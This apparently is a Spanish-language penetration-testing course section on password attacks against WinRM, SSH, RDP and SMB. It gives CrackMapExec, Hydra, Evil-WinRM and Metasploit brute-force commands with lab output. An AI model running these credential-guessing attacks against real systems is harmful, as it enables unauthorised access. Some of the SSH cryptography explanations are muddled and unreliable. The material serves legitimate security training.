Durante nuestras pruebas de penetración, cada red informática que encontremos tendrá servicios instalados para administrar, editar o crear contenido. Todos estos servicios se alojan mediante permisos específicos y se asignan a usuarios específicos. Además de las aplicaciones web, estos servicios incluyen (pero no se limitan a):

|   |   |   |
|---|---|---|
|FTP|SMB|NFS|
|IMAP/POP3|SSH|MySQL/MSSQL|
|RDP|WinRM|VNC|
|Telnet|SMTP|LDAP|
Imaginemos que queremos gestionar un servidor Windows a través de la red. En consecuencia, necesitamos un servicio que nos permita acceder al sistema, ejecutar comandos en él o acceder a su contenido a través de una GUI o el terminal. En este caso, los servicios más habituales adecuados para ello son `RDP`, `WinRM`, y `SSH`. SSH ahora es mucho menos común en Windows, pero es el servicio líder para sistemas basados ​​en Linux.

## WinRM
[Gestión remota de Windows](https://docs.microsoft.com/en-us/windows/win32/winrm/portal) ( `WinRM`) es la implementación de Microsoft del protocolo de red [Protocolo de gestión de servicios web](https://docs.microsoft.com/en-us/windows/win32/winrm/ws-management-protocol) ( `WS-Management`). Es un protocolo de red basado en servicios web XML que utiliza el [Protocolo simple de acceso a objetos](https://docs.microsoft.com/en-us/windows/win32/winrm/windows-remote-management-glossary) ( `SOAP`) utilizado para la gestión remota de sistemas Windows. Se encarga de la comunicación entre [la gestión empresarial basada en web](https://en.wikipedia.org/wiki/Web-Based_Enterprise_Management) ( `WBEM`) y el [Instrumental de administración de Windows](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) ( `WMI`), que puede llamar al [modelo de objetos componentes distribuidos](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/4a893f3d-bd29-48cd-9f43-d9777a4415b0) ( `DCOM`). WinRM usa los puertos TCP `5985` ( `HTTP`) y `5986` ( `HTTPS`).

Una herramienta útil que podemos utilizar para nuestros ataques a contraseñas es [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) , que también se puede utilizar para otros protocolos como SMB, LDAP, MSSQL y otros. Recomendamos leer la [documentación oficial](https://web.archive.org/web/20231116172005/https://www.crackmapexec.wiki/) de esta herramienta para familiarizarse con ella.

#### CrackMapExec

Tenga en cuenta que podemos especificar un protocolo específico y recibir un menú de ayuda más detallado de todas las opciones disponibles para nosotros. CrackMapExec actualmente admite la autenticación remota mediante MSSQL, SMB, SSH y WinRM.
```js
crackmapexec smb -h
```

El formato general para usar CrackMapExec es el siguiente:
```js
crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

```js
p314d0@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

La apariencia de `(Pwn3d!)`es la señal de que lo más probable es que podamos ejecutar comandos del sistema si iniciamos sesión con el usuario por fuerza bruta. Otra herramienta útil que podemos utilizar para comunicarnos con el servicio WinRM es [Evil-WinRM](https://github.com/Hackplayers/evil-winrm) , que nos permite comunicarnos con el servicio WinRM de manera eficiente.

#### Evil-WinRM
```js
sudo gem install evil-winrm
```

```js
evil-winrm -i <target-IP> -u <username> -p <password>
```

```js
p314d0@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password

Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

Si el inicio de sesión fue exitoso, se inicializa una sesión de terminal utilizando el [protocolo de comunicación remota Powershell](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-psrp/602ee78e-9a19-45ad-90fa-bb132b7cecec) ( `MS-PSRP`), que simplifica la operación y ejecución de comandos.

## SSH
Este servicio utiliza tres operaciones/métodos de criptografía diferentes: `symmetric` cifrado, `asymmetric` cifrado, y `hashing`.

#### Cifrado simétrico

El cifrado simétrico utiliza el `same key`para cifrado y descifrado. Sin embargo, cualquiera que tenga acceso a la clave también podrá acceder a los datos transmitidos. Por lo tanto, se necesita un procedimiento de intercambio de claves para un cifrado simétrico seguro. el [método de intercambio de claves Diffie-Hellman](https://en.wikipedia.org/wiki/Diffie%E2%80%93Hellman_key_exchange) Para ello se utiliza . Si un tercero obtiene la clave, no podrá descifrar los mensajes porque se desconoce el método de intercambio de claves. Sin embargo, el servidor y el cliente lo utilizan para determinar la clave secreta necesaria para acceder a los datos. Se pueden utilizar muchas variantes diferentes del sistema de cifrado simétrico, como AES, Blowfish, 3DES, etc.
![](https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/DiffieHellman.png/800px-DiffieHellman.png)

#### Cifrado asimétrico
Usos del cifrado asimétrico `two SSH keys`: una clave privada y una clave pública. La clave privada debe permanecer secreta porque sólo ella puede descifrar los mensajes que han sido cifrados con la clave pública. Si un atacante obtiene la clave privada, que a menudo no está protegida con contraseña, podrá iniciar sesión en el sistema sin credenciales. Una vez que se establece una conexión, el servidor utiliza la clave pública para la inicialización y autenticación. Si el cliente puede descifrar el mensaje, tiene la clave privada y la sesión SSH puede comenzar.

#### Hash
El método hash convierte los datos transmitidos en otro valor único. SSH utiliza hash para confirmar la autenticidad de los mensajes. Este es un algoritmo matemático que solo funciona en una dirección.

#### Hydra - SSH

```js
hydra -L user.list -P password.list ssh://10.129.42.197
```

## Remote Desktop Protocol (RDP)

Es un protocolo de red que permite el acceso remoto a sistemas Windows a través de `TCP port 3389`por defecto.

#### Hydra - RDP
```js
hydra -L user.list -P password.list rdp://10.129.42.197
```

Linux ofrece diferentes clientes para comunicarse con el servidor deseado utilizando el protocolo RDP. Estos incluyen [Remmina](https://remmina.org/) , [rdesktop](http://www.rdesktop.org/) , [xfreerdp](https://linux.die.net/man/1/xfreerdp) y muchos otros. Para nuestros propósitos, trabajaremos con xfreerdp.
#### xFreeRDP

```js
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

## SMB

```js
hydra -L user.list -P password.list smb://10.129.42.197
```

#### Hidra - Error

```shell-session
p314d0@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197

Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

Esto se debe a que lo más probable es que tengamos una versión desactualizada de THC-Hydra que no puede manejar las respuestas SMBv3. Para solucionar este problema, podemos actualizar y recompilar manualmente `hydra` o utilizar otra herramienta muy poderosa, el [framework Metasploit](https://www.metasploit.com/) .

```js
p314d0@htb[/htb]$ msfconsole -q

msf6 > use auxiliary/scanner/smb/smb_login
```

#### CrackMapExec

```js
crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
```

Para comunicarnos con el servidor vía SMB podemos utilizar, por ejemplo, la herramienta [smbclient](https://www.samba.org/samba/docs/current/man-html/smbclient.1.html) . Esta herramienta nos permitirá ver el contenido de los recursos compartidos, cargar o descargar archivos si nuestros privilegios lo permiten.
#### Smbclient
```js
smbclient -U user \\\\10.129.42.197\\SHARENAME
```

